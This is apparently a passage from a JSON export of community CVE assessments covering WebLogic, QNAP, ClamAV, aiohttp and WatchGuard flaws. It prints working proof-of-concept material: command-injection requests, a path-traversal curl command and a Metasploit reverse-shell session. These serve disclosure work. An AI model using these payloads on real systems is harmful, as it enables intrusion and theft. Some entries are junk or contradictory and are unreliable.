application class path for the exploit to work.\r\n\r\n\r\n### CVE-2024-20931\r\nIn the January 2024 patch released by Oracle, a remote command execution vulnerability CVE-2024-20931 based on the Weblogic T3\\IIOP protocol was fixed. This vulnerability still exploits the `getReferent` function inside `weblogic.deployment.jms.ForeignOpaqueReference.class` but it bypasses the patch put in place by CVE-2023-21839. It does this by setting the malicious JNDI url to the environment variable `java.naming.provider.url`:\r\n```\r\nString providerURL = (String) this.jndiEnvironment.get(\"java.naming.provider.url\");\r\n```\r\nwhich gets initialized after `getReferent` is called and allows for this JNDI injection to be exploited in an alternate manner. \r\n\r\n### Caveats\r\nThis vulnerability has the same Java version limitations of its predecessor. In order for the WebLogic Server to be vulnerable it must be running Java <= [1.8.0_151](https://www.oracle.com/java/technologies/javase/8u151-relnotes.html). Given that this version of java is over six years old, the attacker value of this unauthenticated RCE vulnerability is quite low. \r\n\r\n### References\r\nhttps://glassyamadeus.github.io/2024/01/31/CVE_2024_20931/\r\nhttps://github.com/dinosn/CVE-2024-20931",
      "score": 2,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "361bb4d2-f43a-4b49-aba7-8cfba4d74d75",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "398751b4-d590-4809-a40a-aeec5aecb8b4",
      "created": "2024-02-13T17:58:17.776148Z",
      "revisionDate": "2024-02-18T09:41:02.893781Z",
      "document": "An unauthenticated command injection vulnerability exists in the `quick.cgi` component of the web administration server for QNAP QTS and QuTS Hero operating systems, used by numerous QNAP NAS devices. The `quick.cgi` component exposes functionality to remotely provision a QNAP device. An attacker with network access to an uninitialized QNAP NAS device may perform unauthenticated command injection.\r\n\r\nThe vulnerability affects QTS 5.1.x, prior to the vendor patch `QTS 5.1.5.2645 build 20240116`, and QuTS hero h5.1.x, prior to the vendor patch `QuTS hero h5.1.5.2647 build 20240118`.\r\n\r\nA HTTP(S) POST request targeting the `uploaf_firmware_image` functionality of `quick.cgi` can trigger a command injection vulnerability if the user agent contains both the words `Mozilla` and `Macintosh`. This is because a file name passed as part of the POST request multipart form-data will be URL decoded if the user agent matches these special words. This allows for a double quote character (URL encoded as `%22`) to be supplied as part of the file name, allowing a command string to be escaped and command injection to occur.\r\n\r\nAn example request that exploits this vulnerability is as follows:\r\n\r\n```\r\nPOST /cgi-bin/quick/quick.cgi?func=switch_os&todo=uploaf_firmware_image HTTP/1.1\r\nHost: 192.168.86.42:8080\r\nUser-Agent: Mozilla Macintosh\r\nAccept: */*\r\nContent-Length: 164\r\nContent-Type: multipart/form-data;boundary=\"avssqwfz\"\r\n\r\n--avssqwfz\r\nContent-Disposition: form-data; xxpcscma=\"field2\"; zczqildp=\"%22$($(echo -n aWQ=|base64 -d)>a)%22\"\r\nContent-Type: text/plain\r\n\r\nskfqduny\r\n--avssqwfz\u2013\r\n```\r\n\r\nA detailed analysis and PoC can be found in our [Rapid7 disclosure](https://www.rapid7.com/blog/post/2024/02/13/cve-2023-47218-qnap-qts-and-quts-hero-unauthenticated-command-injection-fixed/).",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "3fd6ffcf-dc4d-4c0c-8ed7-dac98ebde64e",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "d23abbd5-a3b1-4c1f-bb35-a74258719348",
      "created": "2024-02-13T18:18:12.978961Z",
      "revisionDate": "2024-02-14T22:52:04.051081Z",
      "document": "ClamAV is a open-source antivirus engine that has been around for the past 21 years and runs on many different operating systems including  for AIX, BSD, HP-UX, Linux, macOS, OpenVMS, OSF, Solaris and Haiku and as of version 0.97.5, ClamAV builds and runs on Microsoft Windows. \r\n\r\nA command injection vulnerability exists in the following ClamAV versions:\r\n - 0.104 (all patch versions)\r\n - 0.105 (all patch versions)\r\n - 1.0.0 through 1.0.4 (LTS)\r\n - 1.1 (all patch versions)\r\n - 1.2.0 and 1.2.1\r\n\r\n\r\nThe command injection vulnerability allows users to execute commands in the context of the user running the ClamAV application, which is commonly a ClamAV daemon running as root though many other configurations are possible.\r\n\r\nThe vulnerability stems from the `VirusEvent` feature which is **not enabled by default** but can be configured in ClamAV\u2019s conf file: `/etc/clamav/clamd.conf`.  The feature is defined in the `clamd.conf` as follows:\r\n```\r\n# Execute a command when virus is found. In the command string %v will\r\n# be replaced with the virus name and %f will be replaced with the file name.\r\n# Additionally, two environment variables will be defined: $CLAM_VIRUSEVENT_FILENAME\r\n# and $CLAM_VIRUSEVENT_VIRUSNAME.\r\n# Default: no\r\n#VirusEvent /usr/local/bin/send_sms 123456789 \"VIRUS ALERT: %v in %f\"\r\n```\r\n\r\nAs stated in the definition above `%v` is the virus name and `%f` is the file name. The file name is not sanitized, allowing an attacker to inject a command into the command string.\r\n\r\n\r\nThe `VirusEvent` feature is handled by the `virusaction` function which is defined in the file `clamd/clamd_others.c`: \r\n```\r\nvoid virusaction(const char *filename, const char *virname,\r\n                 const struct optstruct *opts)\r\n{\r\n    pid_t pid;\r\n    const struct optstruct *opt;\r\n    char *buffer_file, *buffer_vir, *buffer_cmd, *path;\r\n    const char *pt;\r\n    size_t i, j, v = 0, f = 0, len;\r\n    char *env[4];\r\n\r\n    if (!(opt = optget(opts, \"VirusEvent\"))->enabled)\r\n        return;\r\n\r\n    path   = getenv(\"PATH\");\r\n    env[0] = path ? strdup(path) : NULL;\r\n    j      = env[0] ? 1 : 0;\r\n    /* Allocate env vars.. to be portable env vars should not be freed */\r\n    buffer_file =\r\n        (char *)malloc(strlen(VE_FILENAME) + strlen(filename) + 2);\r\n    if (buffer_file) {\r\n        sprintf(buffer_file, \"%s=%s\", VE_FILENAME, filename);\r\n        env[j++] = buffer_file;\r\n    }\r\n\r\n    buffer_vir =\r\n        (char *)malloc(strlen(VE_VIRUSNAME) + strlen(virname) + 2);\r\n    if (buffer_vir) {\r\n        sprintf(buffer_vir, \"%s=%s\", VE_VIRUSNAME, virname);\r\n        env[j++] = buffer_vir;\r\n    }\r\n    env[j++] = NULL;\r\n\r\n    pt = opt->strarg;\r\n    while ((pt = strstr(pt, \"%v\"))) {\r\n        pt += 2;\r\n        v++;\r\n    }\r\n    pt = opt->strarg;\r\n    while ((pt = strstr(pt, \"%f\"))) {\r\n        pt += 2;\r\n        f++;\r\n    }\r\n    len = strlen(opt->strarg);\r\n    buffer_cmd =\r\n        (char *)calloc(len + v * strlen(virname) + f * strlen(filename) + 1, sizeof(char));\r\n    if (!buffer_cmd) {\r\n        if (path)\r\n            xfree(env[0]);\r\n\r\n        xfree(buffer_file);\r\n        xfree(buffer_vir);\r\n        return;\r\n    }\r\n    for (i = 0, j = 0; i < len; i++) {\r\n        if (i + 1 < len && opt->strarg[i] == '%' && opt->strarg[i + 1] == 'v') {\r\n            strcat(buffer_cmd, virname);\r\n            j += strlen(virname);\r\n            i++;\r\n        } else if (i + 1 < len && opt->strarg[i] == '%' && opt->strarg[i + 1] == 'f') {\r\n            strcat(buffer_cmd, filename);\r\n            j += strlen(filename);\r\n            i++;\r\n        } else {\r\n            buffer_cmd[j++] = opt->strarg[i];\r\n        }\r\n    }\r\n\r\n    pthread_mutex_lock(&virusaction_lock);\r\n    /* We can only call async-signal-safe functions after fork(). */\r\n    pid = vfork();\r\n    if (pid == 0) { /* child */\r\n        _exit(execle(\"/bin/sh\", \"sh\", \"-c\", buffer_cmd, NULL, env));\r\n    } else if (pid > 0) { /* parent */\r\n        pthread_mutex_unlock(&virusaction_lock);\r\n        while (waitpid(pid, NULL, 0) == -1 && errno == EINTR) continue;\r\n    } else {\r\n        pthread_mutex_unlock(&virusaction_lock);\r\n        logg(LOGG_ERROR, \"VirusEvent: fork failed.\\n\");\r\n    }\r\n    if (path)\r\n        xfree(env[0]);\r\n\r\n    xfree(buffer_cmd);\r\n    xfree(buffer_file);\r\n    xfree(buffer_vir);\r\n}\r\n```\r\n\r\nThe main purpose of the `virusaction` function is to handle a virus event as defined by the conf file discussed earlier. The function accepts a `filename` and a `virname` (virusname) and its output is a virus alert which is a command run by the  following line of code:\r\n```\r\n  _exit(execle(\"/bin/sh\", \"sh\", \"-c\", buffer_cmd, NULL, env));\r\n```\r\n\r\nAs we can control the inputs to the `buffer_cmd` command injection is trivial. \r\n\r\n\r\n# Example\r\n\r\nIf `clamd.conf` is configured to run an echo command when a VirusEvent is detected, like so:\r\n```\r\nVirusEvent \"echo VIRUS DETECTED: %v in the path %f >> /dev/stdout\"\r\n```\r\nThen the following file name will cause the `whoami` command to be executed and the output of the command will be redirected to stdout as defined by the VirusEvent.\r\n\r\n```\r\necho VIRUS DETECTED: [signature] in the path xmrig;whoami; >> /dev/stdout\r\n```\r\nThen we can see the `whoami` command being executed in the following output:\r\n```\r\nVIRUS DETECTED: Multios.Coinminer.Miner-6781728-2.UNOFFICIAL in the path\r\n/host/crypto-miner/xmrig\r\nroot\r\n```\r\n\r\n# References\r\nhttps://securityonline.info/no-click-required-poc-available-for-clamav-command-injection-bug-cve-2024-20328/\r\nhttps://amitschendel.github.io/vulnerabilites/CVE-2024-20328/\r\n\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "082b6adc-c4e1-4ebd-9fc0-3a4afeb73892",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "420d6dab-a86d-4bc1-ac86-a899056ada84",
      "created": "2024-02-22T16:54:36.138596Z",
      "revisionDate": "2024-02-22T16:54:36.137935Z",
      "document": "Based on writing the [Metasploit exploit module](https://github.com/rapid7/metasploit-framework/pull/18870) for this vulnerability, I have rated the exploitability as very high, as leveraging CVE-2203-1709 to create a new administrator account is trivial. To leverage the vulnerability to get RCE requires more steps, but it is not that complex and exploitation appears reliable. The attacker value for this vulnerability is also very high given the nature of the target software.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b3b020c7-dcf3-434d-88f0-ef5a724ae504",
      "editorId": "190997ff-dc6a-4be3-8464-9eff388c565d",
      "topicId": "0a0155f6-59e5-4aad-b172-65b41a53f0cd",
      "created": "2024-02-25T06:28:52.33353Z",
      "revisionDate": "2024-02-27T17:46:20.138871Z",
      "document": "I reckon we got ourselves a CVE on our hands \u2013 CVE-2024-1548, ya see? This little critter's been sneaky, messin' with Firefox, Thunderbird, and them ESR versions. What's happenin' is, these websites could play tricks by hidin' them fullscreen notifications using a dropdown select input \u2013 real crafty-like. Could lead to some serious head-scratchin' and maybe even a spoofin' showdown.\r\n\r\nNow, in the cybersecurity rodeo, we gotta rope in them MITRE ATT&CK tactics and techniques. This fella's messin' with our minds, so we're talkin' Spoofin' in the Impact corral \u2013 manipulatin' them fullscreen notifications like a snake in the grass.\r\n\r\nAs for severity, we ain't playin' marbles. Gotta check them CVSS scores, but it's lookin' like a hot potato in terms of risk. We're talkin' 'bout gettin' them updates ASAP \u2013 push Firefox past 123, Thunderbird past 115.8. Ain't no time for dilly-dallyin' \u2013 ride 'em, cowboy!\r\n\r\nNow, listen up \u2013 till you get them updates, tread lightly on them websites, especially when they're askin' for fullscreen access. Watch out for them sneaky dropdowns \u2013 don't let 'em pull the wool over your eyes.\r\n\r\nAnd for the cyber guardians with a decade in the saddle, keep them network logs peeled. We're on the lookout for any varmints tryin' to exploit this here CVE-2024-1548. It's a wild ride in the cybersecurity frontier, but with the right moves, we'll keep our digital ranch safe and sound. Happy trails, partner!\r\n",
      "score": -1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "98db16f7-5369-4174-8e63-36fc1b244d45",
      "editorId": "74d8ee81-a055-426d-9e7b-21ec15295ca1",
      "topicId": "fa1957e8-1470-40a4-85b8-a44d2ed74d4a",
      "created": "2024-02-27T12:29:11.346303Z",
      "revisionDate": "2024-02-27T12:49:47.460937Z",
      "document": "# CVE-2024-23334 Path Traversal\r\n\r\n\r\n## Environment Setup\r\n\r\n- Vulnerable code\r\n- pip install aiohttp==3.9.1\r\n```python\r\n# examples/server_simple.py\r\nfrom aiohttp import web\r\n\r\napp = web.Application()\r\napp.router.add_routes([\r\n    web.static(\"/static\", \"static/\", follow_symlinks=True),  # Remove follow_symlinks to avoid the vulnerability\r\n])\r\n\r\nif __name__ == '__main__':\r\n    web.run_app(app)\r\n\r\n# \u8bbf\u95ee https://www.jetbrains.com/help/pycharm/ \u83b7\u53d6 PyCharm \u5e2e\u52a9\r\n\r\n```\r\n\r\nExecute following commands to start an aiohttp:3.9.1 \uff1a\r\n\r\n```\r\npython main.py\r\n```\r\n\r\n\r\n## Exploit\r\n\r\n```bash\r\n\u279c  CVE-2024-23334 git:(master) \u2717 curl --path-as-is http://127.0.0.1:8080/static/../../../../../etc/passwd\r\nroot:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\r\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\r\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\r\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\r\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\r\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\r\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\r\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\r\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\r\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\r\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\r\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\r\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\r\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r\n\r\n```\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "b7e7584c-f44e-41d4-a2f9-20eeefab2d9e",
      "editorId": "7366a78d-6389-4616-9eaf-1373b1294621",
      "topicId": "2a883e6a-f880-4cd2-a167-947498f6f32a",
      "created": "2024-02-27T21:33:07.042084Z",
      "revisionDate": "2024-02-28T10:44:10.999409Z",
      "document": "http://id3.slowdns.me",
      "score": 0,
      "metadata": {},
      "tags": [
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "3ba6ec55-2c39-4110-9841-7fa7d61e3410",
      "editorId": "7366a78d-6389-4616-9eaf-1373b1294621",
      "topicId": "fa1957e8-1470-40a4-85b8-a44d2ed74d4a",
      "created": "2024-02-27T21:36:45.848083Z",
      "revisionDate": "2024-02-28T10:44:13.928538Z",
      "document": "www.google.com",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Initial Access"
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "dca1d0dc-daa6-452b-90a2-292308a1405d",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "d265a6af-eda4-4520-b172-48fafc47ed10",
      "created": "2024-03-03T19:34:51.985344Z",
      "revisionDate": "2024-03-08T12:23:59.205299Z",
      "document": "Almost two years ago (28 march 2022) `jbaines` published some initial analysis on this vulnerability, still questioning what exactly the modus operandus is to exploit this vulnerability.  On the 29th of august 2022, `Charles Fol` from Ambionics Security published a [blog](https://www.ambionics.io/blog/hacking-watchguard-firewalls) where in much detail several vulnerabilities are explained including this one. A similar analysis was done by `Dylan Pindur`, security researcher from AssetNote which reverse engineered this CVE in more detail (find his [blog here](https://www.assetnote.io/resources/research/diving-deeper-into-watchguard-pre-auth-rce-cve-2022-26318)).\r\n\r\nThe most interesting part for me is the fact that the WatchGuard XTM appliance is pretty well protected and hardened. For instance, there is no unix shell installed on the virtual appliance and all filesystems are protected either with `read-only` or `no-exec`, `no-suid` options which make it pretty hard to get privileged access. The only shell access is a old python version (2.7.14) that is installed and available for exploitation.\r\nI will not deep dive the buffer overflow (BOF) vulnerability here because it is pretty well explained in both blogs that I mentioned above.\r\n\r\nI created a Metasploit module that you can find here as [PR 18915 ](https://github.com/rapid7/metasploit-framework/pull/18915) which will use the BOF to get a python interactive console. \r\nThe real fun starts when you have python interactive console access and try to elevate your rights to get `root` on the box. You can do this by exploiting another vulnerability [CVE-2022-31791](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-31791).  \r\nYou can read this more detail in my technical analysis [here](https://attackerkb.com/topics/O8En8pVX7G/cve-2022-31791).\r\n\r\n### Module in action\r\n```shell\r\nmsf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > options\r\n\r\nModule options (exploit/linux/http/watchguard_firebox_unauth_rce_cve_2022_26318):\r\n\r\n   Name       Current Setting  Required  Description\r\n   ----       ---------------  --------  -----------\r\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\r\n   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metas\r\n                                         ploit.html\r\n   RPORT      8080             yes       The target port (TCP)\r\n   SSL        true             no        Negotiate SSL/TLS for outgoing connections\r\n   TARGETURI  /                yes       WatchGuard Firebox base url\r\n   VHOST                       no        HTTP server virtual host\r\n\r\n\r\nPayload options (cmd/unix/reverse_python):\r\n\r\n   Name           Current Setting  Required  Description\r\n   ----           ---------------  --------  -----------\r\n   CreateSession  true             no        Create a new session for every successful login\r\n   LHOST                           yes       The listen address (an interface may be specified)\r\n   LPORT          4444             yes       The listen port\r\n   SHELL          /usr/bin/python  yes       The system shell to use\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Automatic (Reverse Python Interactive Shell)\r\n\r\nView the full module info with the info, or info -d command.\r\n```\r\n```shell\r\nmsf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > set rhosts 192.168.201.24\r\nrhosts => 192.168.201.24\r\nmsf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > set lhost 192.168.201.8\r\nlhost => 192.168.201.8\r\nmsf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > exploit\r\n\r\n[*] Started reverse TCP handler on 192.168.201.8:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Checking if 192.168.201.24:8080 can be exploited.\r\n[+] The target appears to be vulnerable.\r\n[*] 192.168.201.24:8080 - Attempting to exploit...\r\n[*] 192.168.201.24:8080 - Sending payload...\r\n[*] Command shell session 9 opened (192.168.201.8:4444 -> 192.168.201.24:40354) at 2024-03-03 19:50:17 +0000\r\n\r\n\r\nShell Banner:\r\nPython 2.7.14 (default, Oct 16 2019, 15:38:29)\r\n[GCC 6.5.0] on linux2\r\n-----\r\n\r\n>>> import os\r\n>>> import subprocess\r\n>>> os.listdir(\"./\")\r\n['debug', 'platform', 'log', 'wgapi', 'hosts', 'mdev.seq', 'admd.rsync', 'portald', 'portald_data', 'eth0mac', 'rs_sn', '.libtdts_ctrl.lck', 'fw', 'mwan.input', 'wgmsg', 'nwd_dfltmac', 'fqdn_dns_server_list', 'lm.conf', 'sw.conf', 'wcfqdn_label', 'ifmd.cfg.lock', 'wgif_dhcp_eth0.pid', 'wgif_dhcp_eth0_uds', 'wgif_eth1.cfg.lock', 'wgif_eth1.cfg', 'rootca', 'haopevent.log', 'keeper_init_uds', 'sslvpn', 'empty', 'certs.rsync', 'certs.unpack', 'csync', 'ldapsCA', 'iked.semid', 'system_hash.txt', 'iked.params', 'iked.pid', 'cdiag', 'lockout_users.xml', 'dxcpd', 'wgredir.txt', 'dimension', 'affinityd.err', 'wgif_eth0.cfg.lock', 'wgif_eth0.cfg', 'dhcp6d.conf', '6OGD.py', 'ifmd.cfg', 'dhcpd.conf', 'dnsmasq-internal.conf', 'radvd.conf', 'yDnm.py', 'HPM4.py']\r\n>>>\r\n>>> os.getuid()\r\n99\r\n>>> os.getgid()\r\n96\r\n>>> print(open(\"/etc/passwd\").read())\r\nroot:!$6$XlAENt8.$3RgXuDXBhgsf0FqJ0hrzmrh6qAhvMlCkU6Z976KIDI27gxIZOI0f27lkyJwubRxW5VaO4i9olIybS0Z2R9Ihw1:0:0:Administrator:/root:/bin/ash\r\nbin:x:1:1:bin:/bin:\r\nsystem:x:2:96:WG System daemons:/:\r\nnobody:x:99:99:Nobody:/:\r\nwgntp:x:98:98:OpenNTP daemon:/var/run/ntpd:\r\nopenvpn:x:97:97:OpenVPN daemon:/:\r\nwww:x:96:95:WebUI:/:\r\ncli:x:95:95:CLI:/:\r\ncfm:x:94:94:CFM:/var/cfm_sandbox:\r\nagent:x:93:96:WG Agent:/:\r\nscand:x:91:94:Scanning Daemon:/var/run/scand:\r\nspamd:x:90:94:Spam Daemon:/var/cfm_sandbox:\r\nsshd:x:89:89:sshd privilege separation:/var/empty:\r\nquagga:x:88:88:Quagga Dynamic Routing:/var/run/quagga:\r\nwgcha:x:92:96:WG Call Home Agent:/var/run/wgcha:\r\nnetdbg:x:87:87:Diagnostic Utilities:/tmp/netdbg:\r\ncwagent:x:100:100:ConnectWise Agent:/var/empty:\r\ndimension:x:101:101:Dimension Service:/var/run/dimension:\r\ntss:x:102:102:trousers daemon:/:\r\natagent:x:103:103:Autotask Agent:/var/empty:\r\npsad:x:104:104:PSA Daemon:/var/empty:\r\nguac:x:105:105:Guacamole Daemons:/var/run/guac:\r\nportald:x:106:105:Portald:/var/run/portald:\r\nadmin:x:109:109:Admin Cli Access:/etc/wg/admin-home:/usr/bin/cli\r\nwgadmin:x:109:109:Admin 